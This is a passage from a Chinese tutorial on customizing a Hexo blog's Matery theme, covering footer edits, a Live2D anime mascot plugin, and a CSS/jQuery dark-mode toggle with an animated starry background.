<code>hexo clean</code> &amp;&amp; <code>hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h5 id="2-11-修改页脚"><a href="#2-11-修改页脚" class="headerlink" title="2.11 修改页脚"></a>2.11 修改页脚</h5><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h5 id="2-12-添加动漫人物"><a href="#2-12-添加动漫人物" class="headerlink" title="2.12 添加动漫人物"></a>2.12 添加动漫人物</h5><p>安装插件</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> --save hexo-helper-live2d</code></pre><p>安装喜欢的看板娘</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#安装下载动画人物库, 动画人物有很多, 可以网上查询资料, 下面推荐几种.</span><span class="token function">npm</span> <span class="token function">install</span> --save live2d-widget-model-shizuku <span class="token comment" spellcheck="true">#课桌女孩</span><span class="token function">npm</span> <span class="token function">install</span> --save live2d-widget-model-hibiki  <span class="token comment" spellcheck="true">#御姐</span><span class="token function">npm</span> <span class="token function">install</span> --save live2d-widget-model-wanko   <span class="token comment" spellcheck="true">#狗狗</span><span class="token function">npm</span> <span class="token function">install</span> --save live2d-widget-model-haruto  <span class="token comment" spellcheck="true">#海军服女孩</span><span class="token function">npm</span> <span class="token function">install</span> --save live2d-widget-model-miku    <span class="token comment" spellcheck="true">#萝莉</span></code></pre><p>然后打开博客根目录下的 <code>_config.yml</code>文件，添加如下代码：</p><p>使用本地模型方式：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## 添加动画live2d模块  npm install --save hexo-helper-live2d</span><span class="token comment" spellcheck="true">## 下载动画人物库 npm install live2d-widget-model-z16 -D</span>live2d:  enable: <span class="token boolean">true</span>  scriptFrom: local <span class="token comment" spellcheck="true"># 默认</span>  pluginRootPath: live2dw/ <span class="token comment" spellcheck="true"># 插件在站点上的根目录(相对路径)</span>  pluginJsPath: lib/ <span class="token comment" spellcheck="true"># 脚本文件相对与插件根目录路径</span>  pluginModelPath: assets/ <span class="token comment" spellcheck="true"># 模型文件相对与插件根目录路径</span>  tagMode: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span>  debug: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 调试, 是否在控制台输出日志</span>  model:    use: live2d-widget-model-miku  display:    position: right <span class="token comment" spellcheck="true">#动画位置</span>    width: 150    height: 190    <span class="token comment" spellcheck="true"># 位置配置，这个在左侧边栏位置很居中</span>    hOffset: 50  <span class="token comment" spellcheck="true"># 调节水平位置</span>    vOffset: -5  <span class="token comment" spellcheck="true"># 调节垂直位置</span>  mobile:    show: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 是否在移动设备上显示</span>    scale: 0.5 <span class="token comment" spellcheck="true"># 移动设备上的缩放</span>  react:    opacityDefault: 0.7    opacityOnHover: 0.8</code></pre><p>使用网络模型方式：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Live2D</span><span class="token comment" spellcheck="true">## https://github.com/EYHN/hexo-helper-live2d</span>live2d:  enable: <span class="token boolean">true</span>  <span class="token comment" spellcheck="true"># enable: false</span>  pluginRootPath: live2dw/ <span class="token comment" spellcheck="true"># Root path of plugin to be on the site (Relative)</span>  pluginJsPath: lib/ <span class="token comment" spellcheck="true"># JavaScript path related to plugin's root (Relative)</span>  pluginModelPath: assets/ <span class="token comment" spellcheck="true"># Relative model path related to plugin's root (Relative)</span>  scriptFrom: local <span class="token comment" spellcheck="true"># Default</span>  <span class="token comment" spellcheck="true"># scriptFrom: jsdelivr # jsdelivr CDN</span>  <span class="token comment" spellcheck="true"># scriptFrom: unpkg # unpkg CDN</span>  <span class="token comment" spellcheck="true"># scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # Your custom url</span>  tagMode: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># Whether only to replace live2d tag instead of inject to all pages</span>  log: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># Whether to show logs in console</span>  model:    <span class="token comment" spellcheck="true">#use: live2d-widget-model-lwet # npm-module package name</span>    <span class="token comment" spellcheck="true"># use: wanko # folder name in (hexo base dir)/live2d_models/</span>    <span class="token comment" spellcheck="true"># use: ./wives/wanko # folder path relative to hexo base dir</span>    <span class="token comment" spellcheck="true"># 模型：https://huaji8.top/post/live2d-plugin-2.0/</span>    use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json <span class="token comment" spellcheck="true"># Your custom url</span>  display:    position: left    width: 300    height: 400    hOffset: 50    vOffset: 10  mobile:    show: <span class="token boolean">false</span></code></pre><p>效果见右下角</p><p><img src="https://s1.ax1x.com/2022/08/08/vMjnqe.png" alt="live2看板娘"></p><p><a href="https://blog.17lai.site/posts/4a2050e2/#%E6%9B%B4%E5%BC%BA%E5%A4%A7%E7%9A%84%E7%9C%8B%E6%9D%BF%E5%A8%98">更强大的看板娘</a></p><h5 id="2-13-添加夜间模式切换"><a href="#2-13-添加夜间模式切换" class="headerlink" title="2.13 添加夜间模式切换"></a>2.13 添加夜间模式切换</h5><h6 id="2-13-1-设置基础样式"><a href="#2-13-1-设置基础样式" class="headerlink" title="2.13.1 设置基础样式"></a>2.13.1 设置基础样式</h6><p>参考其他优秀产品的黑夜模式，得出共性：</p><p>那就是黑夜模式的背景一般不会是纯黑（#000）；而是淡黑色，字体也不是纯白（#fff）而浅白色<br>图片亮度降低<br>下面就开始贴代码了</p><p>在 <code>themes&gt;hexo-theme-matery&gt;source&gt;css&gt;matery.css</code> 中加上下面的代码</p><pre class=" language-bash"><code class="language-bash">/* 字体颜色变灰白色 */body.DarkMode .fas,body.DarkMode .title,body.DarkMode .row .text,body.DarkMode article .article-content .summary,body.DarkMode .card .card-image .card-title,body.DarkMode .fa-moon-o:before,body.DarkMode .fa-lightbulb-o:before,body.DarkMode article .article-tags .chip,body.DarkMode .chip-container .tag-title,body.DarkMode div.jqcloud a,body.DarkMode .friends-container .tag-title,body.DarkMode .frind-ship .title h1,body.DarkMode .card .card-content p,body.DarkMode .card .card-content .dss,body.DarkMode .v<span class="token punctuation">[</span>data-class<span class="token operator">=</span><span class="token string">'v'</span><span class="token punctuation">]</span> .vcount,body.DarkMode .v<span class="token punctuation">[</span>data-class<span class="token operator">=</span><span class="token string">'v'</span><span class="token punctuation">]</span> .vcount .vnum,body.DarkMode pre code,body.DarkMode h1,body.DarkMode h2,body.DarkMode h3,body.DarkMode h4,body.DarkMode h5,body.DarkMode h6,body.DarkMode li,body.DarkMode p,body.DarkMode header .side-nav .mobile-head .logo-name,body.DarkMode header .side-nav .mobile-head .logo-desc,body.DarkMode header .side-nav .menu-list a,body.DarkMode .bg-cover .post-title,body.DarkMode.read .bg-cover .description <span class="token punctuation">{</span>    color: rgba<span class="token punctuation">(</span>255, 255, 255, 0.6<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>/* 背景颜色变灰色 */body.DarkMode .card,body.DarkMode .block-with-text:after <span class="token punctuation">{</span>    background-color: <span class="token comment" spellcheck="true">#282c34;</span><span class="token punctuation">}</span>/* 背景颜色变黑色 */body.DarkMode,body.DarkMode .v<span class="token punctuation">[</span>data-class<span class="token operator">=</span><span class="token string">'v'</span><span class="token punctuation">]</span> .vcount,body.DarkMode <span class="token comment" spellcheck="true">#rewardModal .modal-content,</span>body.DarkMode .modal,body.DarkMode header .side-nav,body.DarkMode header .side-nav .menu-list .m-nav-show <span class="token punctuation">{</span>    background-color: <span class="token comment" spellcheck="true">#12121c;</span><span class="token punctuation">}</span>/* 改变透明度 */body.DarkMode .aplayer <span class="token punctuation">{</span>    background: <span class="token comment" spellcheck="true">#2f3742 !important;</span><span class="token punctuation">}</span>body.DarkMode img,body.DarkMode strong <span class="token punctuation">{</span>    filter: brightness<span class="token punctuation">(</span>0.7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>/*toc目录滤镜*/body.DarkMode .toc-widget <span class="token punctuation">{</span>    filter: invert<span class="token punctuation">(</span>0.8<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>body.DarkMode .toc-widget .toc-list-item <span class="token punctuation">{</span>    color: <span class="token comment" spellcheck="true">#000</span><span class="token punctuation">}</span>/* Skill bar text color */body.DarkMode .skillbar .skill-bar-percent <span class="token punctuation">{</span>    color: <span class="token comment" spellcheck="true">#000;</span><span class="token punctuation">}</span></code></pre><h6 id="2-13-2-切换按钮"><a href="#2-13-2-切换按钮" class="headerlink" title="2.13.2 切换按钮"></a>2.13.2 切换按钮</h6><p>完成了背景、字体、图片的样式，就需要黑夜白天切换按钮了</p><p>在 <code>themes&gt;hexo-theme-matery&gt;layout&gt;_widget</code> 中创建一个新的文件 <code>day-night.ejs</code>，在新建的文件中加入下面的代码</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>-- 白天和黑夜主题 --<span class="token operator">></span><span class="token operator">&lt;</span>div class<span class="token operator">=</span><span class="token string">"sum-moon-box"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>a class<span class="token operator">=</span><span class="token string">"btn-floating btn-large waves-effect waves-light"</span> onclick<span class="token operator">=</span><span class="token string">"switchNightMode()"</span> title<span class="token operator">=</span><span class="token string">"切换主题"</span> <span class="token operator">></span>    <span class="token operator">&lt;</span>i id<span class="token operator">=</span><span class="token string">"sum-moon-icon"</span> class<span class="token operator">=</span><span class="token string">"fas fa-sun"</span> style<span class="token operator">=</span><span class="token string">"width:48px; height:48px; font-size: 28px;"</span><span class="token operator">></span><span class="token operator">&lt;</span>/i<span class="token operator">></span>  <span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>  <span class="token keyword">function</span> switchNightMode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">$(</span><span class="token string">'&lt;div class="Cuteen_DarkSky">&lt;div class="Cuteen_DarkPlanet">&lt;/div>&lt;/div>'</span><span class="token punctuation">)</span>.appendTo<span class="token punctuation">(</span><span class="token punctuation">$(</span><span class="token string">'body'</span><span class="token punctuation">))</span>,      setTimeout<span class="token punctuation">(</span>function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">$(</span><span class="token string">'body'</span><span class="token punctuation">)</span>.hasClass<span class="token punctuation">(</span><span class="token string">'DarkMode'</span><span class="token punctuation">)</span>         ? <span class="token punctuation">(</span><span class="token punctuation">$(</span><span class="token string">'body'</span><span class="token punctuation">)</span>.removeClass<span class="token punctuation">(</span><span class="token string">'DarkMode'</span><span class="token punctuation">)</span>, localStorage.setItem<span class="token punctuation">(</span><span class="token string">'isDark'</span>, <span class="token string">'0'</span><span class="token punctuation">)</span>, <span class="token punctuation">$(</span><span class="token string">'#sum-moon-icon'</span><span class="token punctuation">)</span>.removeClass<span class="token punctuation">(</span><span class="token string">"fa-sun"</span><span class="token punctuation">)</span>.addClass<span class="token punctuation">(</span><span class="token string">'fa-moon'</span><span class="token punctuation">))</span>         <span class="token keyword">:</span> <span class="token punctuation">(</span><span class="token punctuation">$(</span><span class="token string">'body'</span><span class="token punctuation">)</span>.addClass<span class="token punctuation">(</span><span class="token string">'DarkMode'</span><span class="token punctuation">)</span>, localStorage.setItem<span class="token punctuation">(</span><span class="token string">'isDark'</span>, <span class="token string">'1'</span><span class="token punctuation">)</span>, <span class="token punctuation">$(</span><span class="token string">'#sum-moon-icon'</span><span class="token punctuation">)</span>.addClass<span class="token punctuation">(</span><span class="token string">"fa-sun"</span><span class="token punctuation">)</span>.removeClass<span class="token punctuation">(</span><span class="token string">'fa-moon'</span><span class="token punctuation">))</span>,                  setTimeout<span class="token punctuation">(</span>function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token punctuation">$(</span><span class="token string">'.Cuteen_DarkSky'</span><span class="token punctuation">)</span>.fadeOut<span class="token punctuation">(</span>1e3, <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable"><span class="token variable">$(</span>this<span class="token variable">)</span></span>.remove<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>, 2e3<span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><p>再在 <code>themes&gt;hexo-theme-matery&gt;layout&gt;layout.ejs</code> 文件中引用一下</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>%- partial<span class="token punctuation">(</span><span class="token string">'_widget/day-night.ejs'</span><span class="token punctuation">)</span> %<span class="token operator">></span></code></pre><blockquote><p>需要在 body 标签内部插入下面代码</p></blockquote><h6 id="2-13-3-按钮样式"><a href="#2-13-3-按钮样式" class="headerlink" title="2.13.3 按钮样式"></a>2.13.3 按钮样式</h6><p>完成上面操作以后，就需要添加按钮样式和切换动画了，同样是在 <code>themes&gt;hexo-theme-matery&gt;source&gt;css&gt;matery.css</code> 中</p><pre class=" language-bash"><code class="language-bash">/* 黑夜模式动画 */.Cuteen_DarkSky,.Cuteen_DarkSky:before <span class="token punctuation">{</span>    content: <span class="token string">''</span><span class="token punctuation">;</span>    position: fixed<span class="token punctuation">;</span>    left: 0<span class="token punctuation">;</span>    right: 0<span class="token punctuation">;</span>    top: 0<span class="token punctuation">;</span>    bottom: 0<span class="token punctuation">;</span>    z-index: 8888<span class="token punctuation">;</span><span class="token punctuation">}</span>.Cuteen_DarkSky <span class="token punctuation">{</span>    background: linear-gradient<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#feb8b0, </span><span class="token comment" spellcheck="true">#fef9db);</span><span class="token punctuation">}</span>.Cuteen_DarkSky:before <span class="token punctuation">{</span>    transition: 2s ease all<span class="token punctuation">;</span>    opacity: 0<span class="token punctuation">;</span>    background: linear-gradient<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#4c3f6d, </span><span class="token comment" spellcheck="true">#6c62bb, </span><span class="token comment" spellcheck="true">#93b1ed);</span><span class="token punctuation">}</span>.DarkMode .Cuteen_DarkSky:before <span class="token punctuation">{</span>    opacity: 1<span class="token punctuation">;</span><span class="token punctuation">}</span>.Cuteen_DarkPlanet <span class="token punctuation">{</span>    z-index: 9999<span class="token punctuation">;</span>    position: fixed<span class="token punctuation">;</span>    left: -50%<span class="token punctuation">;</span>    top: -50%<span class="token punctuation">;</span>    width: 200%<span class="token punctuation">;</span>    height: 200%<span class="token punctuation">;</span>    -webkit-animation: CuteenPlanetMove 2s cubic-bezier<span class="token punctuation">(</span>0.7, 0, 0, 1<span class="token punctuation">)</span><span class="token punctuation">;</span>    animation: CuteenPlanetMove 2s cubic-bezier<span class="token punctuation">(</span>0.7, 0, 0, 1<span class="token punctuation">)</span><span class="token punctuation">;</span>    transform-origin: center bottom<span class="token punctuation">;</span><span class="token punctuation">}</span>@-webkit-keyframes CuteenPlanetMove <span class="token punctuation">{</span>    0% <span class="token punctuation">{</span>        transform: rotate<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    to <span class="token punctuation">{</span>        transform: rotate<span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>@keyframes CuteenPlanetMove <span class="token punctuation">{</span>    0% <span class="token punctuation">{</span>        transform: rotate<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    to <span class="token punctuation">{</span>        transform: rotate<span class="token punctuation">(</span>360deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>.Cuteen_DarkPlanet:after <span class="token punctuation">{</span>    position: absolute<span class="token punctuation">;</span>    left: 35%<span class="token punctuation">;</span>    top: 40%<span class="token punctuation">;</span>    width: 9.375rem<span class="token punctuation">;</span>    height: 9.375rem<span class="token punctuation">;</span>    border-radius: 50%<span class="token punctuation">;</span>    content: <span class="token string">''</span><span class="token punctuation">;</span>    background: linear-gradient<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#fefefe, </span><span class="token comment" spellcheck="true">#fffbe8);</span><span class="token punctuation">}</span>/*黑夜模式按钮*/.sum-moon-box <span class="token punctuation">{</span>    width: 48px<span class="token punctuation">;</span>    height: 48px<span class="token punctuation">;</span>    text-align: center<span class="token punctuation">;</span>    border-radius: 50%<span class="token punctuation">;</span>    position: fixed<span class="token punctuation">;</span>    right: 15px<span class="token punctuation">;</span>    bottom: 195px<span class="token punctuation">;</span>    margin-bottom: 0<span class="token punctuation">;</span>    z-index: 900<span class="token punctuation">;</span><span class="token punctuation">}</span>.sum-moon-box .btn-floating <span class="token punctuation">{</span>    width: 48px<span class="token punctuation">;</span>    height: 48px<span class="token punctuation">;</span><span class="token punctuation">}</span>.sum-moon-box i <span class="token punctuation">{</span>    font-size: 1.8rem<span class="token punctuation">;</span>    line-height: 48px <span class="token operator">!</span>important<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h6 id="2-13-4-定时提示切换黑夜模式"><a href="#2-13-4-定时提示切换黑夜模式" class="headerlink" title="2.13.4 定时提示切换黑夜模式"></a>2.13.4 定时提示切换黑夜模式</h6><p>在 <code>themes&gt;hexo-theme-matery&gt;source&gt;js&gt;matery.js</code> 中添加下列代码</p><pre class=" language-bash"><code class="language-bash">//黑夜模式提醒开启功能setTimeout<span class="token punctuation">(</span>function <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">((</span>new Date<span class="token punctuation">(</span><span class="token punctuation">)</span>.getHours<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> 19 <span class="token operator">||</span> new Date<span class="token punctuation">(</span><span class="token punctuation">)</span>.getHours<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> 7<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">$(</span><span class="token string">'body'</span><span class="token punctuation">)</span>.hasClass<span class="token punctuation">(</span><span class="token string">'DarkMode'</span><span class="token punctuation">))</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> toastHTML <span class="token operator">=</span> <span class="token string">'&lt;span style="color:#97b8b2;border-radius: 10px;>'</span> + <span class="token string">'&lt;i class="fa fa-bellaria-hidden="true">&lt;/i>晚上使用黑夜模式阅读能够减轻视觉疲劳。&lt;/span>'</span>        M.toast<span class="token punctuation">(</span><span class="token punctuation">{</span> html: toastHTML <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>, 2000<span class="token punctuation">)</span></code></pre><h6 id="2-13-5-黑夜模式持久化"><a href="#2-13-5-黑夜模式持久化" class="headerlink" title="2.13.5 黑夜模式持久化"></a>2.13.5 黑夜模式持久化</h6><p>在 <code>themes&gt;hexo-theme-matery&gt;layout&gt;layout.ejs</code> 中添加下列代码（最好插入在 <code>&lt;%- partial('_partial/day-night.ejs') %&gt;</code> 下面）</p><pre class=" language-bash"><code class="language-bash">/* 模式判断 */<span class="token operator">&lt;</span>script<span class="token operator">></span>    /* 模式判断 */    <span class="token keyword">if</span> <span class="token punctuation">(</span>localStorage.getItem<span class="token punctuation">(</span><span class="token string">'isDark'</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token string">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        document.body.classList.add<span class="token punctuation">(</span><span class="token string">'DarkMode'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">$(</span><span class="token string">'#sum-moon-icon'</span><span class="token punctuation">)</span>.addClass<span class="token punctuation">(</span><span class="token string">"fa-sun"</span><span class="token punctuation">)</span>.removeClass<span class="token punctuation">(</span><span class="token string">'fa-moon'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        document.body.classList.remove<span class="token punctuation">(</span><span class="token string">'DarkMode'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">$(</span><span class="token string">'#sum-moon-icon'</span><span class="token punctuation">)</span>.removeleClass<span class="token punctuation">(</span><span class="token string">"fa-sun"</span><span class="token punctuation">)</span>.addClass<span class="token punctuation">(</span><span class="token string">'fa-moon'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token operator">&lt;</span>/script<span class="token operator">></span></code></pre><blockquote><p>注意：此处插入的位置不同，在页面上显示的位置就会不同。</p></blockquote><h6 id="2-13-6-黑夜白天切换的动态背景"><a href="#2-13-6-黑夜白天切换的动态背景" class="headerlink" title="2.13.6 黑夜白天切换的动态背景"></a>2.13.6 黑夜白天切换的动态背景</h6><p>下面这是黑夜白天切换的动态背景，在你新建的 <code>day-night.ejs</code> 文件中加入下列代码</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>div class<span class="token operator">=</span><span class="token string">"stars-con"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"stars"</span><span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span>  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"stars2"</span><span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span>  <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"stars3"</span><span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span>  <span class="token operator">&lt;</span>/div<span class="token operator">></span></code></pre><p>在 <code>themes&gt;hexo-theme-matery&gt;source&gt;css&gt;matery.css</code> 中加上下面的代码</p><pre class=" language-bash"><code class="language-bash">/*黑夜模式背景*/body.DarkMode <span class="token punctuation">{</span>    background: linear-gradient<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#15151b, </span><span class="token comment" spellcheck="true">#1b1b2e, </span><span class="token comment" spellcheck="true">#231832) !important;</span><span class="token punctuation">}</span>@keyframes animStar <span class="token punctuation">{</span>    from <span class="token punctuation">{</span>        transform: translateY<span class="token punctuation">(</span>0<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    to <span class="token punctuation">{</span>        transform: translateY<span class="token punctuation">(</span>-2000px<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>body.DarkMode .stars-con <span class="token punctuation">{</span>    position: fixed<span class="token punctuation">;</span>    height: 100vh<span class="token punctuation">;</span>    width: 100vw<span class="token punctuation">;</span>    overflow: hidden<span class="token punctuation">;</span>    z-index: -111<span class="token punctuation">;</span>    background: linear-gradient<span class="token punctuation">(</span><span class="token comment" spellcheck="true">#15151b, </span><span class="token comment" spellcheck="true">#1b1b2e, </span><span class="token comment" spellcheck="true">#231832);</span><span class="token punctuation">}</span>body.DarkMode <span class="token comment" spellcheck="true">#stars {</span>    width: 1px<span class="token punctuation">;</span>    height: 1px<span class="token punctuation">;</span>    background: 0 0<span class="token punctuation">;</span>    box-shadow: 1804px 1265px <span class="token comment" spellcheck="true">#fff, 365px 332px </span><span class="token comment" spellcheck="true">#fff, 86px 1888px </span><span class="token comment" spellcheck="true">#fff, 1888px 484px </span><span class="token comment" spellcheck="true">#fff, 199px 1489px </span><span class="token comment" spellcheck="true">#fff, 1459px 1010px </span><span class="token comment" spellcheck="true">#fff, 807px 388px </span><span class="token comment" spellcheck="true">#fff, 855px 558px </span><span class="token comment" spellcheck="true">#fff, 83px 1095px </span><span class="token comment" spellcheck="true">#fff, 1418px 377px </span><span class="token comment" spellcheck="true">#fff, 677px 886px </span><span class="token comment" spellcheck="true">#fff, 862px 1709px </span><span class="token comment" spellcheck="true">#fff, 1058px 1085px </span><span class="token comment" spellcheck="true">#fff, 50px 1772px </span><span class="token comment" spellcheck="true">#fff, 1941px 1544px </span><span class="token comment" spellcheck="true">#fff, 377px 900px </span><span class="token comment" spellcheck="true">#fff, 184px 712px </span><span class="token comment" spellcheck="true">#fff, 1797px 1928px </span><span class="token comment" spellcheck="true">#fff, 507px 1861px </span><span class="token comment" spellcheck="true">#fff, 1849px 19px </span><span class="token comment" spellcheck="true">#fff, 1399px 200px </span><span class="token comment" spellcheck="true">#fff, 972px 497px </span><span class="token comment" spellcheck="true">#fff, 795px 1109px </span><span class="token comment" spellcheck="true">#fff, 746px 970px </span><span class="token comment" spellcheck="true">#fff, 1524px 972px </span><span class="token comment" spellcheck="true">#fff, 1631px 389px </span><span class="token comment" spellcheck="true">#fff, 1026px 1016px </span><span class="token comment" spellcheck="true">#fff, 1295px 862px </span><span class="token comment" spellcheck="true">#fff, 1258px 1876px </span><span class="token comment" spellcheck="true">#fff, 791px 189px </span><span class="token comment" spellcheck="true">#fff, 1519px 45px </span><span class="token comment" spellcheck="true">#fff, 592px 1405px </span><span class="token comment" spellcheck="true">#fff, 620px 130px </span><span class="token comment" spellcheck="true">#fff, 1044px 1171px </span><span class="token comment" spellcheck="true">#fff, 37px 1578px </span><span class="token comment" spellcheck="true">#fff, 1589px 86px </span><span class="token comment" spellcheck="true">#fff, 1024px 528px </span><span class="token comment" spellcheck="true">#fff, 1613px 568px </span><span class="token comment" spellcheck="true">#fff, 912px 1175px </span><span class="token comment" spellcheck="true">#fff, 1177px 133px </span><span class="token comment" spellcheck="true">#fff, 67px 1641px </span><span class="token comment" spellcheck="true">#fff, 1168px 357px </span><span class="token comment" spellcheck="true">#fff, 310px 1873px </span><span class="token comment" spellcheck="true">#fff, 1187px 573px </span><span class="token comment" spellcheck="true">#fff, 308px 1839px </span><span class="token comment" spellcheck="true">#fff, 565px 24px </span><span class="token comment" spellcheck="true">#fff, 1691px 1555px </span><span class="token comment" spellcheck="true">#fff, 1384px 1551px </span><span class="token comment" spellcheck="true">#fff, 179px 861px </span><span class="token comment" spellcheck="true">#fff, 1850px 1966px </span><span class="token comment" spellcheck="true">#fff, 1169px 1979px </span><span class="token comment" spellcheck="true">#fff, 1182px 1522px </span><span class="token comment" spellcheck="true">#fff, 616px 751px </span><span class="token comment" spellcheck="true">#fff, 1083px 908px </span><span class="token comment" spellcheck="true">#fff, 684px 766px </span><span class="token comment" spellcheck="true">#fff, 67px 955px </span><span class="token comment" spellcheck="true">#fff, 1813px 1714px </span><span class="token comment" spellcheck="true">#fff, 1256px 1413px </span><span class="token comment" spellcheck="true">#fff, 332px 803px </span><span class="token comment" spellcheck="true">#fff, 1670px 1921px </span><span class="token comment" spellcheck="true">#fff, 362px 211px </span><span class="token comment" spellcheck="true">#fff, 1513px 423px </span><span class="token comment" spellcheck="true">#fff, 1304px 1145px </span><span class="token comment" spellcheck="true">#fff, 1292px 1168px </span><span class="token comment" spellcheck="true">#fff, 611px 802px </span><span class="token comment" spellcheck="true">#fff, 1297px 575px </span><span class="token comment" spellcheck="true">#fff, 540px 1289px </span><span class="token comment" spellcheck="true">#fff, 1551px 1678px </span><span class="token comment" spellcheck="true">#fff, 1545px 237px </span><span class="token comment" spellcheck="true">#fff, 423px 138px </span><span class="token comment" spellcheck="true">#fff, 1088px 28px </span><span class="token comment" spellcheck="true">#fff, 642px 1637px </span><span class="token comment" spellcheck="true">#fff, 429px 1293px </span><span class="token comment" spellcheck="true">#fff, 1276px 1900px </span><span class="token comment" spellcheck="true">#fff, 1168px 1696px </span><span class="token comment" spellcheck="true">#fff, 847px 837px </span><span class="token comment" spellcheck="true">#fff, 151px 1395px </span><span class="token comment" spellcheck="true">#fff, 1490px 75px </span><span class="token comment" spellcheck="true">#fff, 1588px 131px </span><span class="token comment" spellcheck="true">#fff, 1739px 1358px </span><span class="token comment" spellcheck="true">#fff, 709px 624px </span><span class="token comment" spellcheck="true">#fff, 343px 502px </span><span class="token comment" spellcheck="true">#fff, 1342px 1690px </span><span class="token comment" spellcheck="true">#fff, 175px 1722px </span><span class="token comment" spellcheck="true">#fff, 964px 1299px </span><span class="token comment" spellcheck="true">#fff, 892px 1326px </span><span class="token comment" spellcheck="true">#fff, 519px 1142px </span><span class="token comment" spellcheck="true">#fff, 1014px 193px </span><span class="token comment" spellcheck="true">#fff, 1181px 360px </span><span class="token comment" spellcheck="true">#fff, 325px 139px </span><span class="token comment" spellcheck="true">#fff, 482px 1199px </span><span class="token comment" spellcheck="true">#fff, 613px 8px </span><span class="token comment" spellcheck="true">#fff, 1976px 1125px </span><span class="token comment" spellcheck="true">#fff, 346px 60px </span><span class="token comment" spellcheck="true">#fff, 1565px 818px </span><span class="token comment" spellcheck="true">#fff, 268px 1590px </span><span class="token comment" spellcheck="true">#fff, 213px 1666px </span><span class="token comment" spellcheck="true">#fff, 800px 464px </span><span class="token comment" spellcheck="true">#fff, 974px 1825px </span><span class="token comment" spellcheck="true">#fff, 1066px 23px </span><span class="token comment" spellcheck="true">#fff, 1995px 1499px </span><span class="token comment" spellcheck="true">#fff, 666px 1130px </span><span class="token comment" spellcheck="true">#fff, 1074px 1710px </span><span class="token comment" spellcheck="true">#fff, 1636px 1483px </span><span class="token comment" spellcheck="true">#fff, 1379px 1509px </span><span class="token comment" spellcheck="true">#fff, 1221px 887px </span><span class="token comment" spellcheck="true">#fff, 1857px 